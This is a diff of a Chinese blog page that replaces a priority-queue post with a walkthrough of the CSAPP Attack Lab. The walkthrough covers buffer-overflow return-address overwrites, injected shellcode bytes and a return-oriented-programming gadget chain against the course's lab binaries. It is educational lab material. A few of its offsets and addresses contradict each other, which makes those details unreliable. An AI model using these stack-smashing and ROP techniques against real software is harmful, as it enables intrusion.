@@ -6,20 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="//chuwenda.cn">
-  <title>优先队列 | 褚文达的博客</title>
+  <title>CSAPP_Attack_lab | 褚文达的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="问题实现算法中的优先级。 分析选用什么数据结构？（考虑增删与查找最值的复杂度。）  数组，检索要$O(n)$，增删可能移位要$O(n)$ 有序数组，可二分查找$O(log(n))$，增删可能要移位要$O(n)$。 双向链表。增删$O(1)$，查找$O(n)$。 堆！增删与查找复杂度都是$O(log(n))$。">
-<meta name="keywords" content="算法设计笔记">
+  <meta name="description" content="实验通过截图！">
+<meta name="keywords" content="CSAPP,lab">
 <meta property="og:type" content="article">
-<meta property="og:title" content="优先队列">
-<meta property="og:url" content="//chuwenda.cn/2019/09/21/算法设计课笔记/优先队列实现/index.html">
+<meta property="og:title" content="CSAPP_Attack_lab">
+<meta property="og:url" content="//chuwenda.cn/2019/10/02/CSAPP_lab/attack_lab/index.html">
 <meta property="og:site_name" content="褚文达的博客">
-<meta property="og:description" content="问题实现算法中的优先级。 分析选用什么数据结构？（考虑增删与查找最值的复杂度。）  数组，检索要$O(n)$，增删可能移位要$O(n)$ 有序数组，可二分查找$O(log(n))$，增删可能要移位要$O(n)$。 双向链表。增删$O(1)$，查找$O(n)$。 堆！增删与查找复杂度都是$O(log(n))$。">
+<meta property="og:description" content="实验通过截图！">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-09-11T02:37:22.690Z">
+<meta property="og:image" content="//chuwenda.cn/img/CSAPP_lab/attack_pic/l1.png">
+<meta property="og:image" content="//chuwenda.cn/img/CSAPP_lab/attack_pic/l2.png">
+<meta property="og:image" content="//chuwenda.cn/img/CSAPP_lab/attack_pic/l3.png">
+<meta property="og:image" content="//chuwenda.cn/img/CSAPP_lab/attack_pic/l4.png">
+<meta property="og:image" content="//chuwenda.cn/img/CSAPP_lab/attack_pic/l5.png">
+<meta property="og:image" content="//chuwenda.cn/img/CSAPP_labattack_pic/getbuf.png">
+<meta property="og:updated_time" content="2020-09-11T02:51:21.854Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="优先队列">
-<meta name="twitter:description" content="问题实现算法中的优先级。 分析选用什么数据结构？（考虑增删与查找最值的复杂度。）  数组，检索要$O(n)$，增删可能移位要$O(n)$ 有序数组，可二分查找$O(log(n))$，增删可能要移位要$O(n)$。 双向链表。增删$O(1)$，查找$O(n)$。 堆！增删与查找复杂度都是$O(log(n))$。">
+<meta name="twitter:title" content="CSAPP_Attack_lab">
+<meta name="twitter:description" content="实验通过截图！">
+<meta name="twitter:image" content="//chuwenda.cn/img/CSAPP_lab/attack_pic/l1.png">
   
     <link rel="alternative" href="/atom.xml" title="褚文达的博客" type="application/atom+xml">
   
@@ -159,66 +166,333 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-算法设计课笔记/优先队列实现" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-CSAPP_lab/attack_lab" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      优先队列
+      CSAPP_Attack_lab
     </h1>
   
 
         
-        <a href="/2019/09/21/算法设计课笔记/优先队列实现/" class="archive-article-date">
-  	<time datetime="2019-09-21T10:39:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-21</time>
+        <a href="/2019/10/02/CSAPP_lab/attack_lab/" class="archive-article-date">
+  	<time datetime="2019-10-02T00:39:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-02</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>实现算法中的优先级。</p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>选用什么数据结构？（考虑增删与查找最值的复杂度。）</p>
-<ul>
-<li>数组，检索要$O(n)$，增删可能移位要$O(n)$</li>
-<li>有序数组，可二分查找$O(log(n))$，增删可能要移位要$O(n)$。</li>
-<li>双向链表。增删$O(1)$，查找$O(n)$。</li>
-<li><p>堆！增删与查找复杂度都是$O(log(n))$。</p>
+        <h1 id="实验通过截图！"><a href="#实验通过截图！" class="headerlink" title="实验通过截图！"></a>实验通过截图！</h1><p><img src="/img/CSAPP_lab/attack_pic/l1.png" alt></p>
+<p><img src="/img/CSAPP_lab/attack_pic/l2.png" alt></p>
 <a id="more"></a>
-<h3 id="堆实现"><a href="#堆实现" class="headerlink" title="堆实现"></a>堆实现</h3><p>堆的物理结构为连续数组，所以逻辑结构应为完全二叉树。</p>
-<h4 id="实现堆的操作"><a href="#实现堆的操作" class="headerlink" title="实现堆的操作"></a>实现堆的操作</h4><blockquote>
-<p>最小堆，任何结点的值都应小于等于父结点值。</p>
+<p><img src="/img/CSAPP_lab/attack_pic/l3.png" alt></p>
+<p><img src="/img/CSAPP_lab/attack_pic/l4.png" alt></p>
+<p><img src="/img/CSAPP_lab/attack_pic/l5.png" alt></p>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这个实验要求实现对程序的攻击。</p>
+<p>实验分为两部分：</p>
+<ul>
+<li>Part1: Code Injection Attacks</li>
+<li>Part2: Return-Oriented Programming</li>
+</ul>
+<h1 id="参考知识"><a href="#参考知识" class="headerlink" title="参考知识"></a>参考知识</h1><p>本实验除了书本上知识外，最好有一定的其他知识储备，这样做实验能更高效。以下将一一列举：</p>
+<ul>
+<li><code>LINUX $: gcc -c filename</code>    #编译、汇编但是不链接，生成.o重定位目标文件。<code>LINUX $: gcc -o outputFilename -c filename</code>也可以添加-o来制定输出文件名字。</li>
+<li><code>LINUX $: objdump -d filename</code> #将.o文件反汇编。语句：<code>LINUX $: objdump -d filename &gt; newfilename</code>可以利用shell的重定位，可以将输出生成文件。</li>
+</ul>
+<h1 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h1><blockquote>
+<p>分享一些我在实验过程中的调试方法。</p>
+<p>（可以跳过这里，直接看下一部分。）</p>
 </blockquote>
+<ul>
+<li><code>LINUX $: gdb ctarget</code>使用gdb工具分析ctarget执行过程</li>
+<li><code>(gdb) $: break getbuf</code>在getbuf函数入口插入断点，这样执行到getbuf会暂停</li>
+<li><code>(gdb) $: r &lt;hex -q</code>运行程序，run，hex作为输入，-q是ctarget的运行参数，相当于<code>LINUX $:  ./ctarget &lt;hex -q</code></li>
+<li><code>(gdb) $: ni</code>next instruction。下一条指令（会跳过函数）。</li>
+<li>结合<code>(gdb) $: print /x $rsp</code>和<code>(gdb) $: print /x *0x某个16进制的地址</code>来查看写入的数据和位置是否和你想的一项。思考一下就能找出bug了。</li>
+</ul>
+<h1 id="Part1-Code-Injection-Attacks"><a href="#Part1-Code-Injection-Attacks" class="headerlink" title="Part1: Code Injection Attacks"></a>Part1: Code Injection Attacks</h1><p>本部分为三个难度等级，由浅入深。</p>
+<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>请令程序ctarget调用子函数touch1()并返回。</p>
+<h3 id="用到的内容"><a href="#用到的内容" class="headerlink" title="用到的内容"></a>用到的内容</h3><ul>
+<li>ctarget：可执行程序——我们的攻击对象。</li>
+<li>hex2raw：生成攻击用字符串</li>
+<li>objdump：生成ctarget的反汇编文件，便于我们研究汇编代码，思考攻击策略。</li>
+<li>gdb：如果没能一次成功，就要用gdb进行调试，找出问题。</li>
+</ul>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>该题的目的是让我们熟悉基本操作。</p>
+<p><strong>如果对栈空间有一定的了解</strong>的话很容易可以想到：因为Gets函数没有写保护机制，写入的内容如果过长就会覆盖一些原有的数据。因为Gets是在栈内写数据，所以我们只要将栈中getbuf的返回地址覆盖成touch1的地址即可。</p>
+<p>生成汇编ctarget反汇编代码：</p>
+<p><code>LINUX $: objdump -d rtarget &gt; rtarget.d</code></p>
+<p>分析汇编代码：</p>
+<blockquote>
+<p>我使用的是vim编辑器</p>
+</blockquote>
+<p><code>LINUX $: vim rtarget.d</code></p>
+<p><code>LINUX $: /getbuf</code> vim的/getbuf指令会向后搜索getbuf并跳转到目标。（：set hls会把搜索结果高亮。：noh可以关闭搜索。）</p>
+<p><img src="/img/CSAPP_labattack_pic/getbuf.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 后面就不上图了，都用代码的方式展示</span><br><span class="line"># rtarget中的getbuf函数体</span><br><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">	4017a8:       48 83 ec 28             sub    $0x28,%rsp		# 可以看出getbuf分配了40个字节的空间</span><br><span class="line">	4017ac:       48 89 e7                mov    %rsp,%rdi		# 将rsp的地址传到rdi，也就是把rsp作为参数传递给了Gets，如果不明白请复习x86的参数传递。</span><br><span class="line">	4017af:       e8 ac 03 00 00          callq  401b60 &lt;Gets&gt;</span><br><span class="line">	4017b4:       b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">	4017b9:       48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">	4017bd:       c3                      retq	# q代表字节数是8，共64位返回地址</span><br><span class="line"> 	4017be:       90                      nop</span><br><span class="line"> 	4017bf:       90                      nop</span><br></pre></td></tr></table></figure>
+<p>根据汇编代码我们可以知道栈空间的结构应该是：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">40-47</th>
+<th>返回地址(返回调用getbuf的函数)（连续8个字节，共64位）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">0-39</td>
+<td>省略……分配的40个字节</td>
+</tr>
+<tr>
+<td style="text-align:center">0</td>
+<td>rdi指向的地址位置，Gets将从这里开始写字节！</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>所以我们将50-57的返回地址更改为touch1的地址即可！</p>
+<p><code>LINUX $: vim rtarget.d</code></p>
+<p><code>LINUX $: /touch1</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 搜索到touch1的位置</span><br><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 我的字符串</span><br><span class="line">01 02 03 04 05 06 07 08 </span><br><span class="line">09 10 11 12 13 14 15 16 </span><br><span class="line">17 18 19 20 21 22 23 24 </span><br><span class="line">25 26 27 28 29 30 31 32 </span><br><span class="line">33 34 35 36 37 38 39 40 # 前40个字节没用，随便写。</span><br><span class="line">C0 17 40 00 00 00 00 00 # touch1的地址。* 小端模式：低位在低地址。</span><br></pre></td></tr></table></figure>
+<p><code>LINUX $:vim txt</code>    把上面的数字输入进去，保存</p>
+<p><code>LINUX $:./hex2raw &lt;hex &gt;raw</code>把txt中的字符串转换成攻击字符串</p>
+<p><code>LINUX $:./rtarget &lt;raw -q</code>    -q表示不与服务器链接，本地进行实验。（详情请参考README文件）</p>
+<p>运行结果参考前面的截图，0_^，level1到此结束。</p>
+<p>写入后的栈结构应该是：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">40-47</th>
+<th>C0 17 40 00 00 00 00 00 （touch1的地址）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">0-39</td>
+<td>01～40</td>
+</tr>
+<tr>
+<td style="text-align:center">0</td>
+<td>01</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>*如果没能一次成功，请参考上文中的调试方法进行调试。</p>
+<h2 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h2><h3 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h3><p>请令程序ctarget调用子函数touch2(unsigned val)并返回，val应该传递用户的cookie值。</p>
+<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>只要明白<strong>x86的参数传递原理</strong>再加上level1的内容，就能够解决本问题。</p>
+<p>函数的第一个整形参数应该由寄存器rdi传递，我们把cookie的值写入rdi再调用touch2即可。</p>
+<p>问题出现了：我们怎么把值写入寄存器？</p>
+<p>答案：我们可以用<strong>注入代码</strong>实现操作。（点题：Code Injection Attacks）</p>
+<p>这部分内容官方指导讲的很详细：</p>
+<ol>
+<li>写汇编代码</li>
+<li>用gcc -c汇编（将汇编语言汇编为机器语言）</li>
+<li>用objdump -d反汇编（为了方便查看指令的机器码）</li>
+<li>将机器码注入到栈空间来执行！</li>
+</ol>
+<p>基于level1，我们希望栈空间的结构应该是（方法不唯一）：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">48-55</th>
+<th>touch2的地址（再次retq可以令指令流跳转到touch2）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">40-47</td>
+<td>攻击代码的的地址（retq可以令指令流跳转到攻击代码）</td>
+</tr>
+<tr>
+<td style="text-align:center">0-39</td>
+<td>攻击代码指令（将cookie传递给rdi，可以用立即数传递）</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ol>
+<li>写汇编代码：</li>
+</ol>
+<p><code>LINUX $:vim code.s</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movl $0x59b997fa, %edi	#	将cookie传送到edi，movl指令会令rdi的高32位赋值0。</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+<ol>
+<li>将代码汇编：</li>
+</ol>
+<p><code>LINUX $:gcc -c code.s</code>    生成code.o文件</p>
+<ol>
+<li>用objdump -d反汇编：</li>
+</ol>
+<p><code>LINUX $:objdump -d code.o &gt; code.d</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi</span><br><span class="line">   5:	c3                   	retq</span><br></pre></td></tr></table></figure>
+<p>得到的<code>bf fa 97 b9 59 c3</code>就是我们想要的攻击代码！</p>
+<ol>
+<li>注入攻击代码：</li>
+</ol>
+<p>*如何获得程序运行时的栈地址？</p>
+<p>用gdb工具：</p>
+<ul>
+<li><code>LINUX $: gdb ctarget</code></li>
+<li><p><code>(gdb) $: break getbuf</code> </p>
 </li>
-<li><p>向上调整。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adjustUp(i)</span><br><span class="line">	<span class="keyword">if</span>(parent(i)&gt;i)&#123;</span><br><span class="line">		swap(i,parent(i))</span><br><span class="line">		adjustUp(parent(i))</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<li><p><code>(gdb) $: r &lt; hex -q</code>，此时程序会站停在getbuf函数的入口。</p>
 </li>
-<li><p>向下调整。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adjustDown(i)</span><br><span class="line">	<span class="keyword">if</span>(i &gt; min(lChild(i),rChild(i)))&#123;</span><br><span class="line">		swap(i,minchild);</span><br><span class="line">		adjustDown(minchild)</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>建堆。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">init(n)	<span class="comment">//建立结点数为n的堆</span></span><br><span class="line">	<span class="keyword">for</span> i=(n<span class="number">-1</span>)/<span class="number">2</span> to <span class="number">0</span> <span class="comment">//根节点编号为0</span></span><br><span class="line">		adjustDown(i)</span><br></pre></td></tr></table></figure>
+<li><p><code>(gdb) $: print /x $rsp</code>，这个栈地址就是我们存放第一次跳转目标的地址。</p>
 </li>
 </ul>
-<h4 id="优先队列实现"><a href="#优先队列实现" class="headerlink" title="优先队列实现"></a>优先队列实现</h4><ul>
-<li><p>创建。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">initPriorityQueue()，返回空数组指针。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 我的攻击字符串，答案不唯一</span><br><span class="line">01 02 03 04 05 06 07 08 </span><br><span class="line">09 10 11 12 13 14 15 16 </span><br><span class="line">17 18 19 20 21 22 23 24 </span><br><span class="line">25 26 27 28 29 30 31 32 </span><br><span class="line">33 34 bf fa 97 b9 59 c3 # bf到c3是我们的注入代码</span><br><span class="line">9a dc 61 55 00 00 00 00 # 这8字节是我们注入代码的地址</span><br><span class="line">ec 17 40 00 00 00 00 00 # 这8字节是touch2的地址</span><br></pre></td></tr></table></figure>
+<p><code>LINUX $:vim txt</code>    把上面的数字输入进去，保存</p>
+<p><code>LINUX $:./hex2raw &lt;hex &gt;raw</code>把txt中的字符串转换成攻击字符串</p>
+<p><code>LINUX $:./rtarget &lt;raw -q</code>    -q表示不与服务器链接，本地进行实验。（详情请参考README文件）</p>
+<p>level2解决！</p>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><h3 id="目标-2"><a href="#目标-2" class="headerlink" title="目标"></a>目标</h3><p>请令程序ctarget调用子函数touch3(char <em>sval)并返回，sval应该传递一块连续存放cookie的<em>*ASCII码</em></em>的内存区域的首地址。我的cookie是：59 b9 97 fa，ascii码为：35 39 62 39 39 37 66 61：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">7</th>
+<th>61</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">6</td>
+<td>66</td>
+</tr>
+<tr>
+<td style="text-align:center">5</td>
+<td>37</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td>39</td>
+</tr>
+<tr>
+<td style="text-align:center">3</td>
+<td>39</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td>62</td>
+</tr>
+<tr>
+<td style="text-align:center">1</td>
+<td>59</td>
+</tr>
+<tr>
+<td style="text-align:center">0</td>
+<td>35(把这个地址传递给rdi)</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>阅读touch3的函数可以知道，sval应该是cookieASCII码字符串的首地址，touch3会调用hexmatch函数，用字符串比较的方式，去检查sval指向的cookie串是否是正确的。这一段就很神奇我怀疑程序怎么知道我的cookie的，于是我就分析了一下touch3的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> /touch3</span><br><span class="line"> 401908:       48 89 fe                mov    %rdi,%rsi	# 将我们传入的cookie首地址作为hexmatch的第二个参数</span><br><span class="line"> 40190b:       8b 3d d3 2b 20 00       mov    0x202bd3(%rip),%edi        # 0x401911 + 0x202bd3 = 0x6044e4，将0x6044e4作为hexmatch的第一个参数</span><br><span class="line"> 401911:       e8 36 ff ff ff          callq  40184c &lt;hexmatch&gt;	</span><br><span class="line"> </span><br><span class="line"> # 用gdb查看一下运行时0x6044e4的值！</span><br><span class="line"> (gdb) print /x *0x6044e4</span><br><span class="line">$1 = 0x59b997fa # 恰好是我的cookie</span><br><span class="line"># 因为hexmatch的参数是（unsign val, char *sval)，后面会把val用sprintf转换成字符串，所以0x6044e4存的不是cookie的ASCII码。</span><br></pre></td></tr></table></figure>
+<p>剩下的步骤和level2几乎一样。</p>
+<ol>
+<li>写汇编代码：</li>
+</ol>
+<p><code>LINUX $:vim code.s</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq    $0x5561dc78,%rdi	#	将ASCII码首地址传送到rdi</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+<ol>
+<li>将代码汇编：</li>
+</ol>
+<p><code>LINUX $:gcc -c code.s</code>    生成code.o文件</p>
+<ol>
+<li>用objdump -d反汇编:</li>
+</ol>
+<p><code>LINUX $:objdump -d code.o &gt; code.d</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 78 dc 61 55 	mov    $0x5561dc78,%rdi # 将cookie的ASCII码地址传给rdi</span><br><span class="line">   7:	c3                   	retq</span><br></pre></td></tr></table></figure>
+<p>得到的<code>48 c7 c7 78 dc 61 55 c3</code>就是我们想要的攻击代码！</p>
+<ol>
+<li>注入攻击代码（答案不唯一）：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 # cookie的ASCII码</span><br><span class="line">09 10 11 12 13 14 15 16 </span><br><span class="line">17 18 19 20 21 22 23 24 </span><br><span class="line">25 26 27 28 29 30 31 32 </span><br><span class="line">48 c7 c7 78 dc 61 55 c3 #攻击代码！</span><br><span class="line">98 dc 61 55 00 00 00 00 # 攻击代码地址</span><br><span class="line">fa 18 40 00 00 00 00 00 # touch3地址</span><br></pre></td></tr></table></figure>
+<p>level3搞定！</p>
+<h1 id="Part2-Return-Oriented-Programming"><a href="#Part2-Return-Oriented-Programming" class="headerlink" title="Part2: Return-Oriented Programming"></a>Part2: Return-Oriented Programming</h1><p>本部分分为两个实验。分别是利用rtarget程序调用touch2和touch3，但是，因为rtarget有安全保护机制：</p>
+<ul>
+<li><p>栈地址内容不可执行</p>
 </li>
-<li><p>插入。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert(x)</span><br><span class="line">	Heap[n] = x</span><br><span class="line">	adjustUp(n)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>随机删除。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span>(i)</span><br><span class="line">	swap(i,last)	<span class="comment">//last为最后一个结点</span></span><br><span class="line">	adjustDown(last)</span><br><span class="line">	adjustUp(last)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>得到最值。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">findMin()</span><br><span class="line">	<span class="keyword">return</span> Heap[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>挑出最值后删除。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popMin()</span><br><span class="line">	val = findMin()</span><br><span class="line">	<span class="keyword">delete</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<li><p>栈地址随机化，程序运行时的栈地址不固定</p>
 </li>
 </ul>
+<p>所以不可以再用前面的代码注入了。这次我们利用rtarget中已经有的机器代码，组合成我们想要的指令。</p>
+<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>实验参考手册说的很详细。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 例如这段代码</span><br><span class="line">29 00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">30   4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line">31   4019c9:       c3                      retq</span><br><span class="line"># 如果PC（也就是RIP）在4019c5的地址，指令就是48 89 c7，是一条movq指令！</span><br></pre></td></tr></table></figure>
+<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><h3 id="目标-3"><a href="#目标-3" class="headerlink" title="目标"></a>目标</h3><p>请令程序rtarget调用函数touch2(unsigned val)并返回，val应该传递用户的cookie值。</p>
+<h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>我们能够用的指令就是start_farm到end_farm之间的指令，为了方便查看，可以把这段内容单独提取出来。文件中，start_farm在第915行，end_farm在1098行。指令：<code>LINUX $:sed -n &#39;915,1098p&#39; rtarget.d &gt; farm.d</code>可以将内容提取出来保存为farm.d。</p>
+<p>这次我们不能直接写指令把立即数传递给touch2了。文档提示可以用movq、popq、retq、nop。</p>
+<p>方法1：利用movq吧cookie传递给rdi，这样太难了，因为这条指令包含cookie值：fa 97 b9 59，找不到这样的代码！</p>
+<p>方法2：利用popq把栈地址内的cookie弹栈给rdi，这个可行！popq %rdi的指令代码是5f，我搜了一下，farm.d里面没有啊！所以我打算找一个中间寄存器，popq-&gt;x-&gt;rdi！找到的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># popq %rax：代码为 58</span><br><span class="line"># runtime address: 0x4019cc</span><br><span class="line">47 00000000004019ca &lt;getval_280&gt;:</span><br><span class="line"> 948   4019ca:       b8 29 58 90 c3          mov    $0xc3905829,%eax</span><br><span class="line"> 949   4019cf:       c3   </span><br><span class="line"></span><br><span class="line"># movl %rax, %rdi：代码为 48 89 c7</span><br><span class="line"># runtime address: 0x4019c6</span><br><span class="line"> 29 00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line"> 30   4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line"> 31   4019c9:       c3                      retq</span><br></pre></td></tr></table></figure>
+<p>所以我们需要栈地址内容为：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">64-71</th>
+<th>touch2的地址</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">56-63</td>
+<td>movl %rax, %rdi的地址0x00000000004019c6</td>
+</tr>
+<tr>
+<td style="text-align:center">48-55</td>
+<td>cookie值</td>
+</tr>
+<tr>
+<td style="text-align:center">40-47</td>
+<td>popq %rax的地址：0x00000000004019cc</td>
+</tr>
+<tr>
+<td style="text-align:center">0-39</td>
+<td>无用字节</td>
+</tr>
+<tr>
+<td style="text-align:center">Gets写入的首地址:0</td>
+<td>无用字节</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>所以写入字符串为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">01 02 03 04 05 06 07 08 </span><br><span class="line">09 10 11 12 13 14 15 16 </span><br><span class="line">17 18 19 20 21 22 23 24 </span><br><span class="line">25 26 27 28 29 30 31 32 </span><br><span class="line">33 34 35 36 37 38 39 40 </span><br><span class="line">cc 19 40 00 00 00 00 00 # popq %rax的地址</span><br><span class="line">fa 97 b9 59 ff ff ff ff # cookie值，只有低4位有效，ffffffff可以为任意值，因为popq弹出8个字节，但是movl只搬运低4字节</span><br><span class="line">c5 19 40 00 00 00 00 00 # movl %rax, %rdi的地址</span><br><span class="line">ec 17 40 00 00 00 00 00 # touch2的地址</span><br></pre></td></tr></table></figure>
+<p>level4解决！</p>
+<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><h3 id="目标-4"><a href="#目标-4" class="headerlink" title="目标"></a>目标</h3><p>令rtarget调用touch3，第一个参数设置为指向cookie的ASCII码的首地址。</p>
